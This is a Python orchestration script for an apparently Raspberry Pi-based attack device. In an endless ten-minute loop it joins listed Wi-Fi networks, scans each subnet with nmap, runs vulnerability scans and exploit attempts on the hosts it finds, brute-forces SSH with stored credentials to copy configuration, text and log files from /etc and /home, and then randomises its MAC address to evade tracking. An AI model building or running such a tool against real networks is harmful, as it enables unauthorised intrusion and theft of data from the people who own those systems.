import os
import time
from wifi.wifi_manager import WiFiManager
from utils.logger import Logger
from scans.nmap_scanner import run_nmap_scan
from utils.html_logger import HTMLLogger
from attacks.recon import Recon
from attacks.vulnerability_scan import VulnerabilityScanner
from attacks.exploit_tester import ExploitTester
from attacks.file_stealer import FileStealer
import subprocess

def load_ssh_credentials():
    """Load SSH credentials from either the config or root directory."""
    potential_paths = [
        "/home/pi/xeno/config/ssh_default_credentials.txt",
        "/root/ssh_default_credentials.txt"
    ]
    for path in potential_paths:
        if os.path.exists(path):
            print(f"[INFO] Found SSH credentials at: {path}")
            credentials = []
            try:
                with open(path, "r") as file:
                    for line in file:
                        line = line.strip()
                        if line and ":" in line:
                            username, password = line.split(":", 1)
                            credentials.append({"username": username, "password": password})
                return credentials
            except Exception as e:
                print(f"[ERROR] Failed to load SSH credentials from {path}: {e}")
                return []
    print("[ERROR] No SSH credentials file found in config or root.")
    return []


def load_wifi_credentials():
    """Load Wi-Fi credentials from either the config or root directory."""
    potential_paths = [
        "/home/pi/xeno/config/wifi_credentials.json",
        "/root/wifi_credentials.json"
    ]
    for path in potential_paths:
        if os.path.exists(path):
            print(f"[INFO] Found Wi-Fi credentials at: {path}")
            try:
                import json
                with open(path, "r") as file:
                    return json.load(file)
            except Exception as e:
                print(f"[ERROR] Failed to load Wi-Fi credentials from {path}: {e}")
                return []
    print("[ERROR] No Wi-Fi credentials file found in config or root.")
    return []


def run_scans(logger, wifi_manager, html_logger):
    """Perform the scanning and processing logic."""
    wifi_credentials = load_wifi_credentials()
    if not wifi_credentials:
        logger.log("[ERROR] No Wi-Fi credentials loaded. Ensure the file exists in either config or root.")
        return

    ssh_credentials = load_ssh_credentials()
    if not ssh_credentials:
        logger.log("[ERROR] No SSH credentials loaded. Ensure the file exists in either config or root.")
        return

    for network in wifi_credentials:
        ssid = network.get("SSID")
        password = network.get("Password")

        if not ssid or not password:
            #logger.log(f"[WARNING] Skipping invalid network entry: {network}")
            continue

        wifi_manager.disconnect_wifi()

        for attempt in range(3):
            logger.log(f"[INFO] Attempting to connect to SSID: {ssid} (Attempt {attempt + 1}/3)")
            if wifi_manager.connect_to_wifi(ssid, password):
                logger.log(f"[SUCCESS] Connected to SSID: {ssid}")
                break
        else:
            #logger.log(f"[ERROR] Skipping network {ssid} due to connection failure.")
            continue

        logger.log(f"[INFO] Running nmap scan for network: {ssid}")
        scan_result = run_nmap_scan("192.168.1.0/24", logger=logger)
        html_logger.save_scan_result_to_json(ssid, scan_result["raw_output"])

        recon = Recon(logger=logger)
        for ip in scan_result["discovered_ips"]:
            recon.run_full_recon(ip, ssid=ssid, html_logger=html_logger)

        vuln_scanner = VulnerabilityScanner(logger=logger)
        vulnerabilities = {}
        for ip in scan_result["discovered_ips"]:
            vuln_results = vuln_scanner.run_scan(ip, ssid=ssid, html_logger=html_logger)
            if vuln_results:
                vulnerabilities[ip] = vuln_results

        exploit_tester = ExploitTester(logger=logger)
        for ip, vuln_data in vulnerabilities.items():
            for vuln in vuln_data["vulnerabilities"]:
                logger.log(f"[INFO] Running exploit testing on IP: {ip} for vulnerability: {vuln}")
                exploit_tester.run_exploit_testing(
                    service_data=vuln,
                    target_ip=ip,
                    ssid=ssid,
                    html_logger=html_logger,
                )

        file_stealer = FileStealer(logger=logger)
        for ip in vulnerabilities.keys():
            successful = False
            for creds in ssh_credentials:
                if file_stealer.steal_files(
                    target_ip=ip,
                    username=creds["username"],
                    password=creds["password"],
                    directories=["/etc", "/home"],
                    file_extensions=[".conf", ".txt", ".log"],
                ):
                    successful = True
                    break

            if successful:
                logger.log(f"[SUCCESS] File stealing successful for IP: {ip}")

        wifi_manager.disconnect_wifi()
     # Change MAC address after completing the scanning cycle
    change_mac_address(logger)
    
def change_mac_address(logger):
    """Change the MAC address of wlan0."""
    try:
        logger.log("[INFO] Changing MAC address for wlan0.")
        # Bring down the interface
        subprocess.run(["sudo", "ifconfig", "wlan0", "down"], check=True)
        # Change the MAC address
        subprocess.run(["sudo", "macchanger", "-r", "wlan0"], check=True)
        # Bring up the interface
        subprocess.run(["sudo", "ifconfig", "wlan0", "up"], check=True)
        logger.log("[SUCCESS] MAC address changed successfully.")
    except subprocess.CalledProcessError as e:
        logger.log(f"[ERROR] Failed to change MAC address: {str(e)}")

def main():
    os.makedirs("logs", exist_ok=True)
    logger = Logger(log_file="logs/scan.log")
    wifi_manager = WiFiManager(logger=logger)
    html_logger = HTMLLogger(output_dir="utils/html_logs", json_dir="utils/json_logs")

    while True:
        logger.log("[INFO] Starting new scanning cycle.")
        run_scans(logger, wifi_manager, html_logger)
        logger.log("[INFO] Scanning cycle completed. Sleeping for 10 minutes.")
        time.sleep(600)  # Sleep for 10 minutes


if __name__ == "__main__":
    main()
